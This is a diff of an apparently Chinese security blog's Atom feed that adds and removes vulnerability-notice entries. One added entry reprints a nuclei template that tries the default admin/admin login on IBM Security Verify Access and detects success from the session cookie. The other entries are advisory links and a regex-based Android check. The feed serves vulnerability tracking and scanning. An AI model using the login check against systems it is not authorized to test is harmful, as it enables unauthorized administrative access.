@@ -6,7 +6,7 @@
   <link href="http://example.com/atom.xml" rel="self"/>
   
   <link href="http://example.com/"/>
-  <updated>2025-06-12T15:30:25.781Z</updated>
+  <updated>2025-06-12T16:45:25.317Z</updated>
   <id>http://example.com/</id>
   
   <author>
@@ -15,6 +15,86 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>IBM Security Verify Access 默认登录凭证漏洞</title>
+    <link href="http://example.com/2025/06/12/github_1225078751/"/>
+    <id>http://example.com/2025/06/12/github_1225078751/</id>
+    <published>2025-06-12T16:45:25.322Z</published>
+    <updated>2025-06-12T16:45:25.317Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> IBM Security Verify Access 默认登录凭证漏洞</p><p><strong>漏洞类型：</strong> 弱口令</p><p><strong>漏洞等级：</strong> 高危</p><p><strong>漏洞描述：</strong> IBM Security Verify Access 被发现存在默认管理员凭证。未经身份验证的远程攻击者可利用此漏洞获取系统特权或管理员访问权限。</p><p><strong>产品厂商：</strong> IBM</p><p><strong>产品名称：</strong> IBM Security Verify Access</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/a4cf4c6d5775cd47dd60e0b6fc6d46344dc6f6fb/http%2Fdefault-logins%2Fibm%2Fibm-security-verify-access-login.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/a4cf4c6d5775cd47dd60e0b6fc6d46344dc6f6fb/http%2Fdefault-logins%2Fibm%2Fibm-security-verify-access-login.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> ibm-security-verify-access-login<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> IBM Security Verify Access Default Login<br>  <span class="hljs-params">author:</span> johnk3r<br>  <span class="hljs-params">severity:</span> high<br>  <span class="hljs-params">description:</span> IBM Security Verify Access default admin credentials were discovered. An unauthenticated, remote attacker can exploit this gain privileged <span class="hljs-keyword">or</span> administrator access to the system.<br>  <span class="hljs-params">classification:</span><br>    <span class="hljs-params">cvss-metrics:</span> CVSS:<span class="hljs-number">3.0</span><span class="hljs-operator">/</span>AV:N<span class="hljs-operator">/</span>AC:L<span class="hljs-operator">/</span>PR:N<span class="hljs-operator">/</span>UI:N<span class="hljs-operator">/</span>S:C<span class="hljs-operator">/</span>C:L<span class="hljs-operator">/</span>I:L<span class="hljs-operator">/</span>A:L<br>    <span class="hljs-params">cvss-score:</span> <span class="hljs-number">8.3</span><br>    <span class="hljs-params">cwe-id:</span> CWE-<span class="hljs-number">522</span><br>  <span class="hljs-params">metadata:</span><br>    <span class="hljs-params">max-request:</span> <span class="hljs-number">3</span><br>  <span class="hljs-params">tags:</span> ibm,default-login<br><br><span class="hljs-params">http:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">raw:</span><br>      <span class="hljs-operator">-</span> |<br>        GET <span class="hljs-symbol">/</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>      <span class="hljs-operator">-</span> |<br>        POST <span class="hljs-symbol">/core/j_security_check</span> HTTP<span class="hljs-symbol">/1.1</span><br>        <span class="hljs-params">Host:</span> &#123;&#123;Hostname&#125;&#125;<br>        <span class="hljs-params">Content-Type:</span> application<span class="hljs-symbol">/x-www-form-urlencoded</span><br><br>        <span class="hljs-attr">j_username</span><span class="hljs-operator">=</span>&#123;&#123;username&#125;&#125;&amp;j_password<span class="hljs-operator">=</span>&#123;&#123;password&#125;&#125;&amp;commit<span class="hljs-operator">=</span>&amp;locale<span class="hljs-operator">=</span>en&amp;_method<span class="hljs-operator">=</span>PUT<br><br>    <span class="hljs-params">attack:</span> pitchfork<br>    <span class="hljs-params">payloads:</span><br>      <span class="hljs-params">username:</span><br>        <span class="hljs-operator">-</span> admin<br>      <span class="hljs-params">password:</span><br>        <span class="hljs-operator">-</span> admin<br><br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> dsl<br>        <span class="hljs-params">dsl:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;status_code == 302&quot;</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;contains(header, &#x27;Set-Cookie: LtpaToken2&#x27;)&quot;</span><br>        <span class="hljs-params">condition:</span> and<br><br><br></code></pre></td></tr></table></figure>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; IBM Security Verify Access 默认登录凭证漏洞&lt;/p&gt;</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
+    
+    <category term="弱口令" scheme="http://example.com/tags/%E5%BC%B1%E5%8F%A3%E4%BB%A4/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>SQL注入漏洞分析面板</title>
+    <link href="http://example.com/2025/06/12/github_3577106666/"/>
+    <id>http://example.com/2025/06/12/github_3577106666/</id>
+    <published>2025-06-12T16:45:11.349Z</published>
+    <updated>2025-06-12T16:45:11.344Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> SQL注入漏洞分析面板</p><p><strong>漏洞编号：</strong></p><ul><li><strong>CVE：</strong> CVE-2025</li></ul><p><strong>漏洞类型：</strong> SQL注入</p><p><strong>漏洞描述：</strong> 通过分析从<a href="https://cve.mitre.org/%E7%BD%91%E7%AB%99%E6%8F%90%E5%8F%96%E7%9A%84%E6%95%B0%E6%8D%AE%EF%BC%8C%E8%AF%A6%E7%BB%86%E7%A0%94%E7%A9%B6%E4%BA%862025%E5%B9%B4%E5%87%BA%E7%8E%B0%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%85%B6%E5%BD%B1%E5%93%8D%E7%9A%84%E7%B3%BB%E7%BB%9F%E3%80%82">https://cve.mitre.org/网站提取的数据，详细研究了2025年出现的SQL注入漏洞及其影响的系统。</a></p><p><strong>来源：</strong> <a href="https://github.com/aysenur1309/CVE-Guvenlik-Acigi-Analiz-Paneli">https://github.com/aysenur1309/CVE-Guvenlik-Acigi-Analiz-Paneli</a></p><p><strong>类型：</strong> CVE-2025:github search</p><h1 id="仓库文件"><a href="#仓库文件" class="headerlink" title="仓库文件"></a>仓库文件</h1><ul><li>.gitignore</li><li>README.md</li></ul><h1 id="来源概述"><a href="#来源概述" class="headerlink" title="来源概述"></a>来源概述</h1><h2 id="CVE-Guvenlik-Acigi-Analiz-Paneli"><a href="#CVE-Guvenlik-Acigi-Analiz-Paneli" class="headerlink" title="CVE-Guvenlik-Acigi-Analiz-Paneli"></a>CVE-Guvenlik-Acigi-Analiz-Paneli</h2><p><a href="https://cve.mitre.org/">https://cve.mitre.org/</a> web sitesinden çektiğim verileri analiz ederek SQL injection ile ilgili 2025 yılında çıkmış açıkları ve açıkların etkili olduğu sistemleri detayları bir şekilde inceledim.</p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; SQL注入漏洞分析面板&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;漏洞编号：&lt;/stron</summary>
+      
+    
+    
+    
+    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
+    
+    
+    <category term="CVE-2025:github search" scheme="http://example.com/tags/CVE-2025-github-search/"/>
+    
+    <category term="SQL注入" scheme="http://example.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>【高危漏洞预警】契约锁电子签章系统远程代码执行漏洞</title>
+    <link href="http://example.com/2025/06/12/weixin_2176423926/"/>
+    <id>http://example.com/2025/06/12/weixin_2176423926/</id>
+    <published>2025-06-12T16:27:43.148Z</published>
+    <updated>2025-06-12T16:27:43.145Z</updated>
+    
+    <content type="html"><![CDATA[<p><strong>公众号：</strong> 飓风网络安全</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/GgnNshKnxcxl3aG4EXeZ1Q">https://mp.weixin.qq.com/s/GgnNshKnxcxl3aG4EXeZ1Q</a></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 飓风网络安全&lt;/p&gt;
+&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/GgnNshKnxcxl3aG4EXeZ1Q&quot;&gt;https://mp.weixin.qq</summary>
+      
+    
+    
+    
+    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
+    
+    
+    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
+    
+    <category term="飓风网络安全" scheme="http://example.com/tags/%E9%A3%93%E9%A3%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"/>
+    
+  </entry>
   
   <entry>
     <title>Metasploit Framework DNS Spoofing Vulnerability</title>
@@ -468,86 +548,6 @@
     <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
     
     <category term="微步在线研究响应中心" scheme="http://example.com/tags/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E7%A0%94%E7%A9%B6%E5%93%8D%E5%BA%94%E4%B8%AD%E5%BF%83/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>AndroidManifest.xml minSdkVersion=21 Check Vulnerability</title>
-    <link href="http://example.com/2025/06/12/github_1983625526/"/>
-    <id>http://example.com/2025/06/12/github_1983625526/</id>
-    <published>2025-06-12T10:15:29.448Z</published>
-    <updated>2025-06-12T10:15:29.446Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="漏洞信息"><a href="#漏洞信息" class="headerlink" title="漏洞信息"></a>漏洞信息</h1><p><strong>漏洞名称：</strong> AndroidManifest.xml minSdkVersion&#x3D;21 Check Vulnerability</p><p><strong>漏洞类型：</strong> 信息泄露</p><p><strong>漏洞等级：</strong> 中危</p><p><strong>漏洞描述：</strong> 此模板识别目标Android应用的最低SDK版本为Android 5.0（API级别21）。针对Android 5.0-5.0.2的应用可能存在严重的安全问题，包括Stagefright漏洞。建议针对更高的最低SDK版本以提高安全性。</p><p><strong>产品名称：</strong> Android applications</p><p><strong>影响版本：</strong> Android 5.0 (API level 21)</p><p><strong>来源：</strong> <a href="https://github.com/projectdiscovery/nuclei-templates/blob/4209627eb4616b5ef4940e1eac2aba0e277b3e09/file%2Fandroid%2Fandroid-minsdk-21-check.yaml">https://github.com/projectdiscovery/nuclei-templates/blob/4209627eb4616b5ef4940e1eac2aba0e277b3e09/file%2Fandroid%2Fandroid-minsdk-21-check.yaml</a></p><p><strong>类型：</strong> projectdiscovery&#x2F;nuclei-templates:github issues</p><h1 id="POC详情"><a href="#POC详情" class="headerlink" title="POC详情"></a>POC详情</h1><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs nix"><br><span class="hljs-params">id:</span> android-minsdk-<span class="hljs-number">2</span>1-check<br><br><span class="hljs-params">info:</span><br>  <span class="hljs-params">name:</span> AndroidManifest.xml minSdkVersion<span class="hljs-operator">=</span><span class="hljs-number">21</span> Check (Local File Scan)<br>  <span class="hljs-params">author:</span> Th3l0newolf<br>  <span class="hljs-params">severity:</span> medium<br>  <span class="hljs-params">description:</span> |<br>    This template identifies Android applications targeting Android <span class="hljs-number">5.0</span> (API level <span class="hljs-number">21</span>) as their minimum SDK version.<br>    Applications <span class="hljs-keyword">with</span> minSdkVersion<span class="hljs-operator">=</span><span class="hljs-number">21</span> may be vulnerable to critical security issues <span class="hljs-keyword">in</span> Android <span class="hljs-number">5</span>.<span class="hljs-number">0</span><span class="hljs-operator">-</span><span class="hljs-number">5.0</span>.<span class="hljs-number">2</span>, including<br>    Stagefright vulnerabilities. It is recommended to target a higher minimum SDK version for better security.<br>  <span class="hljs-params">tags:</span> android,file<br><br><span class="hljs-params">file:</span><br>  <span class="hljs-operator">-</span> <span class="hljs-params">extensions:</span><br>      <span class="hljs-operator">-</span> xml<br>    <span class="hljs-params">matchers:</span><br>      <span class="hljs-operator">-</span> <span class="hljs-params">type:</span> regex<br>        <span class="hljs-params">part:</span> body<br>        <span class="hljs-params">regex:</span><br>          <span class="hljs-operator">-</span> <span class="hljs-string">&quot;android:minSdkVersion<span class="hljs-char escape_">\\</span>s*=<span class="hljs-char escape_">\\</span>s*[&#x27;<span class="hljs-char escape_">\&quot;</span>]21[&#x27;<span class="hljs-char escape_">\&quot;</span>]&quot;</span><br><br><br></code></pre></td></tr></table></figure>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;h1 id=&quot;漏洞信息&quot;&gt;&lt;a href=&quot;#漏洞信息&quot; class=&quot;headerlink&quot; title=&quot;漏洞信息&quot;&gt;&lt;/a&gt;漏洞信息&lt;/h1&gt;&lt;p&gt;&lt;strong&gt;漏洞名称：&lt;/strong&gt; AndroidManifest.xml minSdkVersion&amp;#x3D;</summary>
-      
-    
-    
-    
-    <category term="Github Poc" scheme="http://example.com/categories/Github-Poc/"/>
-    
-    
-    <category term="信息泄露" scheme="http://example.com/tags/%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2/"/>
-    
-    <category term="projectdiscovery/nuclei-templates:github issues" scheme="http://example.com/tags/projectdiscovery-nuclei-templates-github-issues/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>奇安信集团2025年06月补丁库更新通告-第一次更新</title>
-    <link href="http://example.com/2025/06/12/weixin_1178279796/"/>
-    <id>http://example.com/2025/06/12/weixin_1178279796/</id>
-    <published>2025-06-12T10:01:44.747Z</published>
-    <updated>2025-06-12T10:01:44.747Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 奇安信 CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/VZCo7kCj-vx42t5L-UGwaQ">https://mp.weixin.qq.com/s/VZCo7kCj-vx42t5L-UGwaQ</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 奇安信 CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/VZCo7kCj-vx42t5L-UGwaQ&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="奇安信 CERT" scheme="http://example.com/tags/%E5%A5%87%E5%AE%89%E4%BF%A1-CERT/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>【已复现】契约锁电子签章系统远程代码执行漏洞(QVD-2025-23408)安全风险通告</title>
-    <link href="http://example.com/2025/06/12/weixin_1161446601/"/>
-    <id>http://example.com/2025/06/12/weixin_1161446601/</id>
-    <published>2025-06-12T10:01:44.396Z</published>
-    <updated>2025-06-12T10:01:44.395Z</updated>
-    
-    <content type="html"><![CDATA[<p><strong>公众号：</strong> 奇安信 CERT</p><p><strong>链接：</strong> <a href="https://mp.weixin.qq.com/s/gmfx97xH4OHtGSJ0UmgOKA">https://mp.weixin.qq.com/s/gmfx97xH4OHtGSJ0UmgOKA</a></p>]]></content>
-    
-    
-      
-      
-    <summary type="html">&lt;p&gt;&lt;strong&gt;公众号：&lt;/strong&gt; 奇安信 CERT&lt;/p&gt;
-&lt;p&gt;&lt;strong&gt;链接：&lt;/strong&gt; &lt;a href=&quot;https://mp.weixin.qq.com/s/gmfx97xH4OHtGSJ0UmgOKA&quot;&gt;https://mp.weixin.</summary>
-      
-    
-    
-    
-    <category term="微信公众号" scheme="http://example.com/categories/%E5%BE%AE%E4%BF%A1%E5%85%AC%E4%BC%97%E5%8F%B7/"/>
-    
-    
-    <category term="mp.weixin.qq.com" scheme="http://example.com/tags/mp-weixin-qq-com/"/>
-    
-    <category term="奇安信 CERT" scheme="http://example.com/tags/%E5%A5%87%E5%AE%89%E4%BF%A1-CERT/"/>
     
   </entry>
   
